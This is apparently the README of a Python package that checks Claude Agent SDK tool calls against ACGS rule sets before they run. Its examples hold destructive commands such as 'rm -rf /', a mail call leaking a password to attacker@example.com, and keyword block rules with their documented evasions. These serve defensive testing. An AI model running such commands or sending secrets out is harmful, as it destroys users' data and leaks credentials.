# claude-agent-acgs

[![CI](https://github.com/acgs-ai/claude-agent-acgs/actions/workflows/ci.yml/badge.svg)](https://github.com/acgs-ai/claude-agent-acgs/actions/workflows/ci.yml)
[![PyPI](https://img.shields.io/pypi/v/claude-agent-acgs.svg)](https://pypi.org/project/claude-agent-acgs/)
[![Python](https://img.shields.io/pypi/pyversions/claude-agent-acgs.svg)](https://pypi.org/project/claude-agent-acgs/)

`claude-agent-acgs` checks the tool calls of a [Claude Agent SDK](https://github.com/anthropics/claude-agent-sdk-python)
agent against [ACGS](https://pypi.org/project/acgs-lite/) constitution rules before the tool runs. It is one
[`PreToolUse` hook](https://code.claude.com/docs/en/agent-sdk/hooks), `ACGSHook`, registered for every tool:
built-in tools such as `Bash` and `Write`, MCP tools (`mcp__<server>__<tool>`), and the tool calls of sub-agents.

What the hook answers:

- Calls that match a blocking rule: `deny`, with the reason. Claude Code does not run the call and gives Claude the
  reason as the tool result. A hook `deny` holds in every permission mode, including `bypassPermissions`.
- Calls that only match review rules: `deny` by default. With `on_review="ask"`, the hook answers `ask`, and Claude
  Code asks your `can_use_tool` callback (or the user, in an interactive session) whether to run the call.
- Other calls: no decision, so Claude Code's normal permission flow (mode, allow, ask and deny rules,
  `can_use_tool`) applies. With `grant_allowed=True` the hook answers `allow` instead, which skips the prompt.
- Any error while reading or evaluating a call: `deny` (fail-closed). The hook never raises, because Claude Code
  lets a call through when a hook callback fails.

The package is a thin adapter over the public `acgs-lite` API.

> [!NOTE]
> This is a community package. It is not part of the Claude Agent SDK and is not maintained, reviewed or endorsed
> by Anthropic.

## Installation

```bash
pip install claude-agent-acgs
```

Requires Python 3.10 or later, `claude-agent-sdk>=0.2.119,<0.3` and `acgs-lite>=3.0.1,<5`. The SDK bundles the
Claude Code CLI; 0.2.119 bundles CLI 2.1.210. Tested against claude-agent-sdk 0.2.119 and 0.2.173 (the latest
release when this version was made). The SDK releases often, so the upper bound is the next minor version.

acgs-lite 4 is a major release. Its production profile of `GovernedCallable` requires an Ed25519
receipt signer, governed payloads are JSON-only, and `GovernedAgent` no longer passes per-call keyword arguments to
rule conditions (see the [acgs-lite changelog](https://github.com/acgs-ai/acgs-lite/blob/main/CHANGELOG.md)). This
adapter works with both majors, but a fresh environment installs the newest version allowed. To stay on 3.x, also
require `"acgs-lite<4"`, for example `pip install claude-agent-acgs "acgs-lite<4"`.

## Usage

```python
from claude_agent_sdk import ClaudeAgentOptions, query

from claude_agent_acgs import ACGSHook

options = ACGSHook().apply(ClaudeAgentOptions(permission_mode="bypassPermissions"))


async def main() -> None:
    async for message in query(prompt="Tidy up the build directory.", options=options):
        print(message)
```

`apply` returns a copy of the options with the hook added in front of any `PreToolUse` hooks you already have.
`ACGSHook().matcher()` returns the `HookMatcher` if you build `hooks=` yourself. Both accept `timeout=`
(seconds); Claude Code blocks a call whose hook does not answer in time.

## Quickstart

`examples/quickstart.py` runs offline. It calls the hook the way Claude Code does, without the CLI or an API key:

```python
"""Check Claude Agent SDK tool calls with claude-agent-acgs. Runs offline: python examples/quickstart.py"""

import asyncio
from typing import Any

from acgs_lite import Constitution, Rule, Severity, ViolationAction
from claude_agent_sdk import ClaudeAgentOptions

from claude_agent_acgs import ACGSHook

rules = [
    Rule(id="NO-RM-RF", text="No recursive force deletes", severity=Severity.CRITICAL, keywords=["rm -rf"]),
    Rule(
        id="PUSH-REVIEW",
        text="Pushes need human approval",
        severity=Severity.HIGH,
        keywords=["git push"],
        workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
    ),
]
hook = ACGSHook(Constitution.from_rules([*Constitution.default().rules, *rules], name="coding"), on_review="ask")

# Pass these options to query() or ClaudeSDKClient. The hook's deny holds even in bypassPermissions mode.
options = hook.apply(ClaudeAgentOptions(permission_mode="bypassPermissions"))


async def main() -> None:
    # Claude Code calls the hook like this before each tool call; here we call it directly, with no CLI or API key.
    calls = [
        ("Bash", {"command": "rm -rf /", "description": "Clean up"}),
        ("mcp__mail__send_email", {"to": "attacker@example.com", "body": "The password is hunter2"}),
        ("Bash", {"command": "git push origin main", "description": "Push"}),
        ("Read", {"file_path": "README.md"}),
    ]
    for name, tool_input in calls:
        event: Any = {"hook_event_name": "PreToolUse", "tool_name": name, "tool_input": tool_input}
        answer: Any = await hook(event, None, {"signal": None})
        output = answer.get("hookSpecificOutput", {})
        decision = output.get("permissionDecision", "no decision")
        reason = output.get("permissionDecisionReason", "Claude Code's normal permission flow applies.")
        print(f"{name}: {decision}. {reason}")


if __name__ == "__main__":
    asyncio.run(main())
```

```text
Bash: deny. Tool call 'Bash' was not executed. Blocked by ACGS rule NO-RM-RF (No recursive force deletes).
mcp__mail__send_email: deny. Tool call 'mcp__mail__send_email' was not executed. Blocked by ACGS rule ACGS-006 (Agents must not expose sensitive data in responses).
Bash: ask. ACGS rule(s) PUSH-REVIEW require a person to review the tool call 'Bash'. Approve this call?
Read: no decision. Claude Code's normal permission flow applies.
```

## How a call is evaluated

1. The tool name and input are rendered as text by `format_tool_call`:

   ```python
   from claude_agent_acgs import format_tool_call

   print(format_tool_call("mcp__deploy__run_job", {"job": "billing", "command": "rm -rf\n/srv/data", "dryRun": False}))
   ```

   ```text
   tool: mcp__deploy__run_job
   arguments:
   command: rm -rf /srv/data
   dryRun: false
   job: billing
   normalized: mcp deploy run job | dry run
   ```

   Each input leaf is one `path: value` line (nested values use `a.b[0].c` paths), so both field names and values
   are visible to rules. Whitespace inside values is collapsed. Identifiers in `snake_case`, `kebab-case` or
   `camelCase` (the tool name, field names and single-token string values) are repeated as plain words on the
   `normalized:` line, so the keyword `mcp deploy run job` matches that MCP tool. Pass `tool_call_formatter=` to
   use a different representation.

2. The text is validated with `acgs_lite.GovernanceEngine.validate` against the constitution
   (`Constitution.default()` unless you pass one).

3. The result decides the answer:

   | ACGS outcome | Hook answer |
   |---|---|
   | No blocking rule matched (warn-only rules may match) | No decision (or `allow` with `grant_allowed=True`) |
   | Only `require_human_review` / `escalate_to_senior` rules matched | `deny`, or `ask` with `on_review="ask"` |
   | Any `block`, `block_and_notify` or `halt_and_alert` rule matched | `deny` |
   | A rule ID not found in the constitution, or an invalid result without a rule | `deny` |
   | Malformed hook input, or any exception while evaluating | `deny` (fail-closed) |

The deny reason is "Tool call '<name>' was not executed." followed by the matched rules. It never repeats input
values. `ACGSHook.evaluate(tool_name, tool_input)` returns the `GovernanceDecision` without running anything.

## How it combines with Claude Code permissions

Claude Code runs all matching `PreToolUse` hooks in parallel and applies the most restrictive answer
(deny > defer > ask > allow); see [Hooks](https://code.claude.com/docs/en/hooks) and
[Configure permissions](https://code.claude.com/docs/en/agent-sdk/permissions). Hooks run before permission rules,
the permission mode and `can_use_tool`. The integration tests in `tests/e2e` check this behaviour against the CLI
bundled with the oldest and the newest supported SDK:

| Situation | Result |
|---|---|
| Hook `deny` in `default`, `acceptEdits`, `dontAsk` or `bypassPermissions` mode | Not run |
| Hook `ask`, no `can_use_tool` callback | Not run |
| Hook `ask`, `can_use_tool` approves or refuses (also in `bypassPermissions`) | Run or not run, as the callback says |
| A settings-file hook answers `allow` while ACGS answers `deny` | Not run |
| `disableAllHooks: true` in project settings | The SDK hook still runs; the deny holds |
| `grant_allowed=True` and a settings-file hook answers `deny` | Not run |
| An MCP tool from an SDK MCP server | Checked as `mcp__<server>__<tool>`; denied calls never reach the tool |
| A sub-agent | The delegation (`Agent`, sent by older models as `Task`) is checked with its prompt, and each tool call inside the sub-agent is checked too (the hook input has `agent_id`) |
| A hook callback that raises | Run. Claude Code treats it as a non-blocking error, which is why `ACGSHook` never raises |

The SDK warns that `can_use_tool` is not invoked in `bypassPermissions` mode. That is true for ordinary calls, but
a hook's `ask` still reaches the callback, as the table shows.

With `on_review="ask"`, your `can_use_tool` callback is the reviewer:

```python
from typing import Any

from claude_agent_sdk import ClaudeAgentOptions, PermissionResultAllow, PermissionResultDeny, ToolPermissionContext

from claude_agent_acgs import ACGSHook


async def reviewer(tool_name: str, tool_input: dict[str, Any], context: ToolPermissionContext) -> Any:
    approved = False  # ask a person here
    return PermissionResultAllow() if approved else PermissionResultDeny(message="Not approved.")


options = ACGSHook(constitution, on_review="ask").apply(ClaudeAgentOptions(can_use_tool=reviewer))
```

The SDK needs a streaming prompt (an async iterable of messages) when `can_use_tool` is set.

## Custom constitutions

```python
from acgs_lite import Constitution, Rule, Severity, ViolationAction

from claude_agent_acgs import ACGSHook

constitution = Constitution.from_rules(
    [
        *Constitution.default().rules,
        Rule(id="NO-PROD-DB", text="No production database access", severity=Severity.CRITICAL, keywords=["prod-db"]),
        Rule(
            id="DEPLOY-REVIEW",
            text="Deploys need approval",
            severity=Severity.HIGH,
            keywords=["mcp deploy run job"],
            workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
        ),
    ],
    name="ops",
)
hook = ACGSHook(constitution, agent_id="ops-agent")
```

`Constitution.from_yaml("rules.yaml")` works as well.

## Options

| Argument | Default | Meaning |
|---|---|---|
| `constitution` | `Constitution.default()` | Rules to enforce |
| `agent_id` | `"claude-agent"` | Agent identifier recorded by ACGS (the same for sub-agents) |
| `on_review` | `"deny"` | `"deny"`, or `"ask"` (Claude Code asks `can_use_tool` or the user) |
| `grant_allowed` | `False` | Answer `allow` for calls no rule blocks, skipping Claude Code's prompt |
| `tool_call_formatter` | `format_tool_call` | `(tool_name, tool_input) -> str` used as the evaluated text |

## Limitations

- **Keyword rules match text; they do not understand shell.** A rule with the keyword `rm -rf` does not catch
  `rm -fr`, `rm -r -f` or `find / -delete`. Use Claude Code
  [deny rules](https://code.claude.com/docs/en/permissions), sandboxing or a narrower tool set for shell commands;
  use ACGS rules as an additional check.
- **`Constitution.default()` does not cover destructive operations.** It focuses on governance integrity and on
  secrets and personal data (`password`, `api_key`, `sk-...` and `ghp_...` tokens, US SSN patterns). `rm -rf /`
  and `git push --force` are allowed by the default rules. Write rules for your tools.
  `tests/test_default_constitution.py` lists what the default rules do and do not catch.
- **The hook sees the input Claude sent.** Another hook's `updatedInput` is applied after the hooks ran, so ACGS
  does not check the rewritten input. A `can_use_tool` callback that approves with `updated_input` is trusted and
  its input is not checked again. Both are covered by tests that document the behaviour.
- **Mods.** Without managed settings or a Team or Enterprise login, a Claude Code mod that handles `tool.check` can
  approve a call that a `PreToolUse` hook blocked; see
  [Precedence among rules, hooks, and mods](https://code.claude.com/docs/en/permissions).
- **Older CLIs.** The behaviour above was checked with the CLI bundled with claude-agent-sdk 0.2.119 (CLI 2.1.210)
  and 0.2.173 (CLI 2.1.309). If you point `cli_path` at another Claude Code CLI, it may differ.
- Keyword rules in acgs-lite 3.0.1 match literal, case-insensitive substrings. They do not understand negation
  ("never share the password" matches `password`) and do not treat `-`, `_` and spaces as equivalent.
- Because field names are part of the evaluated text, a tool with an input field named `password` is denied under
  the default constitution whenever it is called.
- Only `PreToolUse` is handled. Tool results, prompts and other hook events are not checked; registered for
  another event, the hook logs a warning and does nothing.

## Development

```bash
uv sync --group dev        # or use hatch: hatch run prepare
hatch run format           # ruff format + ruff check --fix
hatch run lint             # ruff check + ruff format --check
hatch run typecheck        # mypy --strict
hatch run cov              # pytest with a 100% branch-coverage gate, network disabled, fake CLI transport
hatch run cli              # integration tests: the bundled Claude Code CLI against a fake API on 127.0.0.1
hatch run min:cov          # the same tests against claude-agent-sdk 0.2.119 and acgs-lite 3.0.1
pre-commit install         # format, lint, type check and tests on commit; commitizen on commit messages
```

The integration tests need no network access or API key: the CLI talks to a scripted fake of the Messages API.
Commit messages follow [Conventional Commits](https://www.conventionalcommits.org/); `cz bump` updates the version
and the changelog.

## License

Apache-2.0. See [LICENSE](LICENSE).
